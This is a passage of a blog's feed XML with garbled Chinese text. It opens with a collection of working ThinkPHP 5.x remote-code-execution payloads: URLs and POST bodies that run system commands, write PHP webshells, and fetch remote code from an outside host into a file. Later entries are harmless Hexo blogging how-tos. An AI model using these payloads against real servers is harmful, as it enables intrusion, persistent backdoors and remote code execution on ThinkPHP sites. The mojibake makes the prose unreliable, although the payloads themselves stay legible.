href="https://test.com/?s=index/index">https://test.com/?s=index/index</a></p></blockquote><pre><code>POST s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=systemaaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoamic=system&amp;f=calc&amp;_method=filter</code></pre><blockquote><p>å†™shell</p></blockquote><pre><code>POSTs=file_put_contents(&#39;zerosec.php&#39;,&#39;&lt;?php phpinfo();&#39;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</code></pre><blockquote><p>æœ‰captchaè·¯ç”±æ—¶æ— éœ€debug=true</p><p><a href="https://test.com/?s=captcha/calc">https://test.com/?s=captcha/calc</a></p></blockquote><pre><code>POST _method=__construct&amp;filter[]=system&amp;method=GET</code></pre><h3 id="Thinkphp-5-0-21"><a href="#Thinkphp-5-0-21" class="headerlink" title="Thinkphp 5.0.21"></a>Thinkphp 5.0.21</h3><p>1ã€poc</p><pre><code>http://0-sec.org/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></pre><p>2ã€poc</p><pre><code>http://0-sec.org/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></pre><p>3ã€poc</p><pre><code>http://0-sec.org/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=@eval($_GET[&#39;fuck&#39;]);&amp;fuck=system(&quot;whoami&quot;);</code></pre><p>4ã€poc</p><pre><code>http://0-sec.org/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=@eval($_GET[&#39;fuck&#39;]);&amp;fuck=eval($_POST[ian])</code></pre><h3 id="Thinkphp-5-0-22"><a href="#Thinkphp-5-0-22" class="headerlink" title="Thinkphp 5.0.22"></a>Thinkphp 5.0.22</h3><p>1ã€poc</p><pre><code>http://0-sec.org/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></pre><p>2ã€poc</p><pre><code>http://0-sec.org/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=</code></pre><h3 id="Thinkphp-5-0-23"><a href="#Thinkphp-5-0-23" class="headerlink" title="Thinkphp 5.0.23"></a>Thinkphp 5.0.23</h3><pre><code>POST /index.php?s=captcha HTTP/1.1Host: yuoripAccept-Encoding: gzip, deflateAccept: */* Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 72_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><h3 id="Thinkphp-5-1-18"><a href="#Thinkphp-5-1-18" class="headerlink" title="Thinkphp 5.1.18"></a>Thinkphp 5.1.18</h3><p>1ã€å¸¸è§„poc</p><pre><code>http://www.xxxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=index11.php&amp;vars[1][1]=&lt;?=file_put_contents(&#39;index_bak2.php&#39;,file_get_contents(&#39;https://www.hack.com/xxx.js&#39;));?&gt;</code></pre><p>2ã€æ‰€æœ‰ç›®å½•éƒ½æ— å†™å…¥æƒé™,base64å‡½æ•°è¢«æ‹¦æˆª</p><pre><code> http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_POST[1]</code></pre><h3 id="Thinkphp-5-1-29"><a href="#Thinkphp-5-1-29" class="headerlink" title="Thinkphp 5.1.29"></a>Thinkphp 5.1.29</h3><p>1ã€ä»£ç æ‰§è¡Œ</p><pre><code>http://test.com/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1http://test.com/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1http://test.com/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></pre><p>2ã€å‘½ä»¤æ‰§è¡Œ</p><pre><code>http://test.com/?s=index/\think\Request/input&amp;filter=system&amp;data=æ“ä½œç³»ç»Ÿå‘½ä»¤http://test.com/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=æ“ä½œç³»ç»Ÿå‘½ä»¤http://test.com/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=æ“ä½œç³»ç»Ÿå‘½ä»¤</code></pre><p>3ã€æ–‡ä»¶å†™å…¥</p><pre><code>http://test.com/?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3Ehttp://test.com/?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3</code></pre><p>ä»¥ä¸Šèµ„æºæ¥æºä¸äº’è”ç½‘ï¼Œå¦‚æœ‰ä¾µæƒï¼Œè¯·é‚®ç®±è”ç³»æˆ‘ï¼ŒåŠæ—¶åˆ é™¤ã€‚</p><p><a href="https://www.anquanke.com/post/id/104847">https://www.anquanke.com/post/id/104847</a></p><p><a href="https://www.cnblogs.com/AtesetEnginner/p/12203534.html">https://www.cnblogs.com/AtesetEnginner/p/12203534.html</a></p>]]></content>
    
    
    <summary type="html">ThinkPHP 3.x ï¼Œ5.x æ¼æ´ç›¸å…³çš„RCEï¼ŒåªåŒ…å«å‘½ä»¤æ‰§è¡ŒPOCæˆ–è€…EXPã€‚</summary>
    
    
    
    <category term="çº¢é˜Ÿæ‰“ç‚¹" scheme="https://fz1lin.com/categories/%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9/"/>
    
    
    <category term="ThinkPHP" scheme="https://fz1lin.com/tags/ThinkPHP/"/>
    
    <category term="RCE" scheme="https://fz1lin.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>Hexo å†™ä½œæ¸…å•</title>
    <link href="https://fz1lin.com/2021/2056430684/"/>
    <id>https://fz1lin.com/2021/2056430684/</id>
    <published>2021-12-01T10:59:41.000Z</published>
    <updated>2021-12-22T11:54:56.236Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Hexoæ–‡ç« ç®¡ç†"><a href="#0x01-Hexoæ–‡ç« ç®¡ç†" class="headerlink" title="0x01 Hexoæ–‡ç« ç®¡ç†"></a>0x01 Hexoæ–‡ç« ç®¡ç†</h2><h3 id="1-åˆ›å»ºä¸€ä¸ªmdæ–‡ä»¶"><a href="#1-åˆ›å»ºä¸€ä¸ªmdæ–‡ä»¶" class="headerlink" title="1.åˆ›å»ºä¸€ä¸ªmdæ–‡ä»¶"></a>1.åˆ›å»ºä¸€ä¸ª<a href="https://www.zhihu.com/search?q=md%E6%96%87%E4%BB%B6&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:156915260%7D">mdæ–‡ä»¶</a></h3><p>mdæ–‡ä»¶ä¹Ÿå°±æ˜¯<code>Markdown</code>æ–‡ä»¶ï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥åˆ›å»ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo new &lt;title&gt;</span><br><span class="line">hexo new <span class="string">&quot;æˆ‘çš„ç¬¬ä¸€ç¯‡æ–‡ç« &quot;</span></span><br></pre></td></tr></table></figure><h3 id="2-å¸ƒå±€ï¼ˆlayoutï¼‰"><a href="#2-å¸ƒå±€ï¼ˆlayoutï¼‰" class="headerlink" title="2.å¸ƒå±€ï¼ˆlayoutï¼‰"></a>2.å¸ƒå±€ï¼ˆlayoutï¼‰</h3><ul><li>åˆ›å»ºmdæ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šå¸ƒå±€</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">hexo</span> <span class="string">new</span> [<span class="string">layout</span>] <span class="string">&lt;title&gt;$</span> <span class="string">hexo</span> <span class="string">new</span> <span class="string">page</span> <span class="string">&quot;æˆ‘çš„é¡µé¢&quot;</span></span><br></pre></td></tr></table></figure><ul><li>å¸ƒå±€æœ‰ä¸‰ç§ï¼š<code>post</code>ï¼ˆæ–‡ç« ï¼‰ã€<code>draft</code>ï¼ˆè‰ç¨¿ï¼‰ã€<code>page</code>ï¼ˆé¡µé¢ï¼‰</li></ul><p>åœ¨æ–°å»ºæ–‡ä»¶æ—¶ï¼ŒHexo ä¼šæ ¹æ® <code>scaffolds</code> æ–‡ä»¶å¤¹å†…ç›¸å¯¹åº”çš„æ–‡ä»¶ï¼ˆå¯ä»¥ç†è§£ä¸ºæ¨¡æ¿ï¼‰æ¥å»ºç«‹mdæ–‡ä»¶ï¼š</p><h3 id="3-è‰ç¨¿ï¼ˆdraftï¼‰"><a href="#3-è‰ç¨¿ï¼ˆdraftï¼‰" class="headerlink" title="3.è‰ç¨¿ï¼ˆdraftï¼‰"></a>3.è‰ç¨¿ï¼ˆdraftï¼‰</h3><p><code>draft</code>è¿™ç§å¸ƒå±€åœ¨å»ºç«‹æ—¶ä¼šè¢«ä¿å­˜åˆ° <code>source/_drafts</code> æ–‡ä»¶å¤¹ä¸­ï¼Œä½†ä¸ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œå¦‚æœæˆ‘ä»¬ä¸æƒ³æŸä¸€ç¯‡æ–‡ç« æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œé‚£ä¹ˆå°±å¯ä»¥æŠŠå®ƒç§»åŠ¨åˆ°<code>_drafts</code>æ–‡ä»¶å¤¹ä¸­ã€‚</p><ul><li>æˆ‘ä»¬å¯åœ¨å¯åŠ¨æœåŠ¡å™¨æ—¶åŠ ä¸Š <code>--draft</code> å‚æ•°æ¥æŸ¥çœ‹è‰ç¨¿ã€‚</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">hexo</span> <span class="string">server</span> <span class="string">--draft</span></span><br></pre></td></tr></table></figure><ul><li>è¿˜å¯ä»¥åœ¨ç«™ç‚¹é…ç½®æ–‡ä»¶ä¸­æŠŠ <code>render_drafts</code> å‚æ•°è®¾ä¸º <code>true</code> æ¥é¢„è§ˆè‰ç¨¿ã€‚</li><li>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>publish</code> å‘½ä»¤å°†è‰ç¨¿å‘å¸ƒæ–‡ç« æˆ–è€…é¡µé¢ï¼Œå®ƒå°†ä¼šè¢«ç§»åŠ¨åˆ°æŒ‡å®šçš„æ–‡ä»¶å¤¹ã€‚</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">hexo</span> <span class="string">publish</span> [<span class="string">layout</span>] <span class="string">&lt;title&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-æ¦‚è¿°æ–‡ç« "><a href="#0x02-æ¦‚è¿°æ–‡ç« " class="headerlink" title="0x02 æ¦‚è¿°æ–‡ç« "></a>0x02 æ¦‚è¿°æ–‡ç« </h2><h3 id="æ–¹æ³•ä¸€ï¼šå†™æ¦‚è¿°"><a href="#æ–¹æ³•ä¸€ï¼šå†™æ¦‚è¿°" class="headerlink" title="æ–¹æ³•ä¸€ï¼šå†™æ¦‚è¿°"></a>æ–¹æ³•ä¸€ï¼šå†™æ¦‚è¿°</h3><p>åœ¨å¯¹åº”æ–‡ç« å¯¹ <code>front-matter</code>ï¼ˆæ–‡ç« æ–‡ä»¶æœ€ä¸Šæ–¹ä»¥ <code>---</code>åˆ†å‰²å¯¹åŒºåŸŸï¼Œæ˜¯ç”¨æ¥æŒ‡å®šä¸ªåˆ«æ–‡ä»¶çš„é…ç½®å˜é‡åŒºåŸŸï¼‰ä¸­æ·»åŠ <code>description</code>å˜é‡ï¼Œå…¶ä¸­<code>description</code>å˜é‡è®¾ç½®çš„å†…å®¹å°±ä¼šè¢«æ˜¾ç¤ºåœ¨é¦–é¡µä¸Šé—¨ï¼Œå…¶ä½™çš„æ–‡æ¡ˆä¸€å¾‹ä¸æ˜¾ç¤ºã€‚é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hexo</span> <span class="string">å†™ä½œæ¸…å•</span></span><br><span class="line"><span class="attr">categories:</span>  <span class="string">Hexo</span>   <span class="string">//åˆ†ç±»</span></span><br><span class="line"><span class="attr">tags:</span>               <span class="string">//æ ‡ç­¾</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Hexo</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">å†™ä½œåšå®¢çš„æµç¨‹</span>   <span class="string">//æ¦‚è¿°</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸€ç§æ–¹æ³•æ˜¯éœ€è¦è‡ªå·±å†™æ¦‚è¿°ï¼Œæ‰€ä»¥æ¯”è¾ƒè´¹äº‹ï¼Œäºæ˜¯å°±æœ‰äº†ç¬¬äºŒç§æ–¹æ³•ã€‚</p><h3 id="æ–¹æ³•äºŒï¼šæ–‡ç« æˆªæ–­æ˜¾ç¤º"><a href="#æ–¹æ³•äºŒï¼šæ–‡ç« æˆªæ–­æ˜¾ç¤º" class="headerlink" title="æ–¹æ³•äºŒï¼šæ–‡ç« æˆªæ–­æ˜¾ç¤º"></a>æ–¹æ³•äºŒï¼šæ–‡ç« æˆªæ–­æ˜¾ç¤º</h3><p>è¿™ç§æ–¹æ³•åªéœ€è¦åœ¨å¯¹åº”çš„æ–‡ç« é‡Œï¼Œæƒ³è¦å±•ç¤ºçš„æ–‡ç« åæ·»åŠ ä»¥ä¸‹æ ‡ç­¾å°±å¯ä»¥äº†</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&lt;!--more--&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åé¦–é¡µå°±ä¼šæ˜¾ç¤ºåœ¨è¿™ä¸ªæ ‡ç­¾ä»¥ä¸Šçš„æ‰€æœ‰å†…å®¹ï¼Œéšè—æ–‡ç« ä¸‹é¢çš„æ‰€æœ‰å†…å®¹ã€‚ </p><h2 id="0x03-Front-matter-é¢„å®šè®¾ç½®"><a href="#0x03-Front-matter-é¢„å®šè®¾ç½®" class="headerlink" title="0x03 Front-matter é¢„å®šè®¾ç½®"></a>0x03 Front-matter é¢„å®šè®¾ç½®</h2><table><thead><tr><th>é…ç½®é€‰é¡¹</th><th>é»˜è®¤å€¼</th><th>æè¿°</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> çš„æ–‡ä»¶æ ‡é¢˜</td><td>æ–‡ç« æ ‡é¢˜ï¼Œå¼ºçƒˆå»ºè®®å¡«å†™æ­¤é€‰é¡¹</td></tr><tr><td>date</td><td>æ–‡ä»¶åˆ›å»ºæ—¶çš„æ—¥æœŸæ—¶é—´</td><td>å‘å¸ƒæ—¶é—´ï¼Œå¼ºçƒˆå»ºè®®å¡«å†™æ­¤é€‰é¡¹ï¼Œä¸”æœ€å¥½ä¿è¯å…¨å±€å”¯ä¸€</td></tr><tr><td>author</td><td>æ ¹ <code>_config.yml</code> ä¸­çš„ <code>author</code></td><td>æ–‡ç« ä½œè€…</td></tr><tr><td>img</td><td><code>featureImages</code> ä¸­çš„æŸä¸ªå€¼</td><td>æ–‡ç« ç‰¹å¾å›¾ï¼Œæ¨èä½¿ç”¨å›¾åºŠ(è…¾è®¯äº‘ã€ä¸ƒç‰›äº‘ã€åˆæ‹äº‘ç­‰)æ¥åšå›¾ç‰‡çš„è·¯å¾„.å¦‚: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>æ¨èæ–‡ç« ï¼ˆæ–‡ç« æ˜¯å¦ç½®é¡¶ï¼‰ï¼Œå¦‚æœ <code>top</code> å€¼ä¸º <code>true</code>ï¼Œåˆ™ä¼šä½œä¸ºé¦–é¡µæ¨èæ–‡ç« </td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>ç‰ˆæœ¬æ–°å¢ï¼Œè¡¨ç¤ºè¯¥æ–‡ç« æ˜¯å¦éœ€è¦åŠ å…¥åˆ°é¦–é¡µè½®æ’­å°é¢ä¸­</td></tr><tr><td>coverImg</td><td>æ— </td><td><code>v1.0.2</code>ç‰ˆæœ¬æ–°å¢ï¼Œè¡¨ç¤ºè¯¥æ–‡ç« åœ¨é¦–é¡µè½®æ’­å°é¢éœ€è¦æ˜¾ç¤ºçš„å›¾ç‰‡è·¯å¾„ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™é»˜è®¤ä½¿ç”¨æ–‡ç« çš„ç‰¹è‰²å›¾ç‰‡</td></tr><tr><td>password</td><td>æ— </td><td>æ–‡ç« é˜…è¯»å¯†ç ï¼Œå¦‚æœè¦å¯¹æ–‡ç« è®¾ç½®é˜…è¯»éªŒè¯å¯†ç çš„è¯ï¼Œå°±å¯ä»¥è®¾ç½® <code>password</code> çš„å€¼ï¼Œè¯¥å€¼å¿…é¡»æ˜¯ç”¨ <code>SHA256</code> åŠ å¯†åçš„å¯†ç ï¼Œé˜²æ­¢è¢«ä»–äººè¯†ç ´ã€‚å‰ææ˜¯åœ¨ä¸»é¢˜çš„ <code>config.yml</code> ä¸­æ¿€æ´»äº† <code>verifyPassword</code> é€‰é¡¹</td></tr><tr><td>toc</td><td><code>true</code></td><td>æ˜¯å¦å¼€å¯ TOCï¼Œå¯ä»¥é’ˆå¯¹æŸç¯‡æ–‡ç« å•ç‹¬å…³é—­ TOC çš„åŠŸèƒ½ã€‚å‰ææ˜¯åœ¨ä¸»é¢˜çš„ <code>config.yml</code> ä¸­æ¿€æ´»äº† <code>toc</code> é€‰é¡¹</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>æ˜¯å¦å¼€å¯æ•°å­¦å…¬å¼æ”¯æŒ ï¼Œæœ¬æ–‡ç« æ˜¯å¦å¼€å¯ <code>mathjax</code>ï¼Œä¸”éœ€è¦åœ¨ä¸»é¢˜çš„ <code>_config.yml</code> æ–‡ä»¶ä¸­ä¹Ÿéœ€è¦å¼€å¯æ‰è¡Œ</td></tr><tr><td>summary</td><td>æ— </td><td>æ–‡ç« æ‘˜è¦ï¼Œè‡ªå®šä¹‰çš„æ–‡ç« æ‘˜è¦å†…å®¹ï¼Œå¦‚æœè¿™ä¸ªå±æ€§æœ‰å€¼ï¼Œæ–‡ç« å¡ç‰‡æ‘˜è¦å°±æ˜¾ç¤ºè¿™æ®µæ–‡å­—ï¼Œå¦åˆ™ç¨‹åºä¼šè‡ªåŠ¨æˆªå–æ–‡ç« çš„éƒ¨åˆ†å†…å®¹ä½œä¸ºæ‘˜è¦</td></tr><tr><td>categories</td><td>æ— </td><td>æ–‡ç« åˆ†ç±»ï¼Œæœ¬ä¸»é¢˜çš„åˆ†ç±»è¡¨ç¤ºå®è§‚ä¸Šå¤§çš„åˆ†ç±»ï¼Œåªå»ºè®®ä¸€ç¯‡æ–‡ç« ä¸€ä¸ªåˆ†ç±»</td></tr><tr><td>tags</td><td>æ— </td><td>æ–‡ç« æ ‡ç­¾ï¼Œä¸€ç¯‡æ–‡ç« å¯ä»¥å¤šä¸ªæ ‡ç­¾</td></tr><tr><td>keywords</td><td>æ–‡ç« æ ‡é¢˜</td><td>æ–‡ç« å…³é”®å­—ï¼ŒSEO æ—¶éœ€è¦</td></tr><tr><td>reprintPolicy</td><td>cc_by</td><td>æ–‡ç« è½¬è½½è§„åˆ™ï¼Œ å¯ä»¥æ˜¯ cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint æˆ– pay ä¸­çš„ä¸€ä¸ª</td></tr></tbody></table><h3 id="1-ä¸ºæ–‡ç« æ·»åŠ åˆ†ç±»ä¸æ ‡ç­¾"><a href="#1-ä¸ºæ–‡ç« æ·»åŠ åˆ†ç±»ä¸æ ‡ç­¾" class="headerlink" title="1.ä¸ºæ–‡ç« æ·»åŠ åˆ†ç±»ä¸æ ‡ç­¾"></a>1.ä¸ºæ–‡ç« æ·»åŠ åˆ†ç±»ä¸æ ‡ç­¾</h3><p>åªæœ‰æ–‡ç« ï¼ˆpostå¸ƒå±€ï¼‰æ”¯æŒåˆ†ç±»å’Œæ ‡ç­¾ï¼Œéœ€è¦åœ¨<code>Front-matter</code>ä¸­è®¾ç½®ã€‚åˆ†ç±»æœ‰å±‚çº§å…³ç³»ï¼Œæ ‡ç­¾æ²¡æœ‰ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼š<br>1ï¼‰ä¸‹é¢æ–‡ç« å®ƒçš„æ ‡ç­¾æ˜¯ï¼šHexoã€åšå®¢<br>2ï¼‰åˆ†ç±»æ˜¯ï¼š ä¸ªäººåšå®¢ &gt; Hexoåšå®¢<br>3ï¼‰â€œHexoåšå®¢â€ æ˜¯ â€œä¸ªäººåšå®¢â€ çš„å­åˆ†ç±»</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">ä¸ªäººåšå®¢ï¼ˆç¬¬ä¸€å±‚çº§ï¼‰</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Hexoåšå®¢ï¼ˆç¬¬äºŒå±‚çº§ï¼‰</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Hexo</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">åšå®¢</span></span><br></pre></td></tr></table></figure><h3 id="2-ä¸ºæ–‡ç« æ·»åŠ å¤šä¸ªåˆ†ç±»"><a href="#2-ä¸ºæ–‡ç« æ·»åŠ å¤šä¸ªåˆ†ç±»" class="headerlink" title="2.ä¸ºæ–‡ç« æ·»åŠ å¤šä¸ªåˆ†ç±»"></a>2.ä¸ºæ–‡ç« æ·»åŠ å¤šä¸ªåˆ†ç±»</h3><p>1ï¼‰ä¸‹é¢æ–‡ç« å±äºä¸‰ä¸ªåˆ†ç±»ï¼šæ—¥å¸¸ &gt; ç”Ÿæ´»ï¼Œæ—¥å¸¸ &gt; éšæƒ³ï¼Œæ—¥è®°<br>2ï¼‰å…¶ä¸­ç”Ÿæ´»ã€éšæƒ³ä¸ºæ—¥å¸¸çš„å­åˆ†ç±»ï¼Œæ—¥å¸¸å’Œæ—¥è®°ä¸ºåŒçº§åˆ†ç±»</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="bullet">-</span> [<span class="string">æ—¥å¸¸</span>, <span class="string">ç”Ÿæ´»</span>]</span><br><span class="line"><span class="bullet">-</span> [<span class="string">æ—¥å¸¸</span>, <span class="string">éšæƒ³</span>]</span><br><span class="line"><span class="bullet">-</span> [<span class="string">æ—¥è®°</span>]</span><br></pre></td></tr></table></figure><h2 id="0x03-éƒ¨ç½²å‘½ä»¤"><a href="#0x03-éƒ¨ç½²å‘½ä»¤" class="headerlink" title="0x03 éƒ¨ç½²å‘½ä»¤"></a>0x03 éƒ¨ç½²å‘½ä»¤</h2><h3 id="åŸºæœ¬æ“ä½œ"><a href="#åŸºæœ¬æ“ä½œ" class="headerlink" title="åŸºæœ¬æ“ä½œ"></a>åŸºæœ¬æ“ä½œ</h3><ul><li>æ¸…é™¤ç¼“å­˜ï¼š<code>hexo clean</code></li><li>ç”Ÿæˆé™æ€æ–‡ä»¶ï¼š<code>hexo generate</code>å¯ç®€å†™ä¸º <code>hexo g</code></li><li>å¯åŠ¨æœåŠ¡å™¨ï¼š<code>hexo server</code>æˆ–è€… <code>hexo s</code> å¸¸ç”¨å‚æ•°ï¼š<code>-pï¼ˆ--portï¼‰</code>é‡è®¾ç«¯å£</li><li>éƒ¨ç½²ï¼š<code>hexo deploy</code>å¯ç®€å†™ä¸º<code>hexo d</code>ï¼Œç”¨äºå°†ç½‘ç«™éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šã€‚ï¼ˆæš‚æ—¶ç”¨ä¸åˆ°ï¼Œç›®å‰éƒ½æ˜¯åœ¨æœ¬åœ°ï¼Œåé¢æˆ‘ä»¬å°†åšå®¢æ‰˜ç®¡åˆ°<code>GitHub Pages</code>æˆ–<code>Gitee Pages</code>æ—¶æ‰ä¼šç”¨åˆ°æ­¤å‘½ä»¤ï¼‰<br>å¸¸ç”¨å‚æ•°ï¼š<code>-gï¼ˆ--generateï¼‰</code>ï¼Œ<code>hexo d -g</code>éƒ¨ç½²å‰é¢„å…ˆç”Ÿæˆé™æ€æ–‡ä»¶ï¼Œç­‰åŒäº <code>hexo g -d</code></li></ul><p>å‘å¸ƒæ–‡ç« æˆ–è€…ä¿®æ”¹åšå®¢åæ‰§è¡Œæµç¨‹ï¼š</p><p>æ¸…é™¤ç¼“å­˜&gt;ç”Ÿæˆé™æ€æ–‡ä»¶&gt;å¯åŠ¨æœåŠ¡å™¨ï¼Œæµ‹è¯•æ²¡é—®é¢˜åå†éƒ¨ç½²ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// æˆ‘ä»¬å¯ä»¥å†™æˆä¸€æ¡å‘½ä»¤</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Hexo å†™ä½œæµç¨‹çš„æ¦‚è¿°ï¼ŒåŒ…å«äº†å‘½ä»¤ï¼Œè®¾ç½®ç­‰</summary>
    
    
    
    <category term="Hexo-about" scheme="https://fz1lin.com/categories/Hexo-about/"/>
    
    
    <category term="Hexo" scheme="https://fz1lin.com/tags/Hexo/"/>
    
    <category term="blog" scheme="https://fz1lin.com/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>Hexo å›¾ç‰‡å­˜æ”¾çš„é—®é¢˜</title>
    <link href="https://fz1lin.com/2021/448087847/"/>
    <id>https://fz1lin.com/2021/448087847/</id>
    <published>2021-12-03T02:02:32.000Z</published>
    <updated>2021-12-22T11:54:24.994Z</updated>
    
    <content type="html"><![CDATA[<p>å¦‚æœä½¿ç”¨ typoraï¼Œé»˜è®¤ä¸Šä¼ æœåŠ¡å™¨æ˜¯æ‰¾ä¸åˆ°å›¾ç‰‡çš„ï¼Œæ‰€ä»¥è¦å¼€å¯è¯¥åŠŸèƒ½</p><h2 id="é…ç½®ç«™ç‚¹é…ç½®æ–‡ä»¶"><a href="#é…ç½®ç«™ç‚¹é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®ç«™ç‚¹é…ç½®æ–‡ä»¶"></a>é…ç½®ç«™ç‚¹é…ç½®æ–‡ä»¶</h2><p>æ˜¯æ ¹ç›®å½•ä¸‹çš„ <code>_config.yml</code> çš„é…ç½®æ–‡ä»¶</p><p>æœç´¢</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">post_asset_folder:true</span></span><br></pre></td></tr></table></figure><p>åœ¨åšå®¢æ ¹ç›®å½•ä¸‹ï¼Œå®‰è£…æ’ä»¶</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">npm</span> <span class="string">install</span> <span class="string">https://github.com/CodeFalling/hexo-asset-image</span> <span class="string">--save</span></span><br></pre></td></tr></table></figure><p>ç„¶åå¯ä»¥å°†typoraçš„è·¯å¾„æ”¹ä¸º</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">./$&#123;filename&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/448087847/image-20211203100700456.png" alt="image-20211203100700456"> </p><p>ä¿®æ”¹æˆåŠŸå </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">hexo</span> <span class="string">clean</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">g</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">s</span></span><br><span class="line"><span class="string">hexo</span> <span class="string">d</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºæ–‡ç« ä¼šåœ¨ <code>source/_posts</code>ç›®å½•ä¸‹åˆ›å»ºåŒåæ–‡ä»¶å¤¹å’ŒåŒåçš„.md æ–‡ä»¶</p>]]></content>
    
    
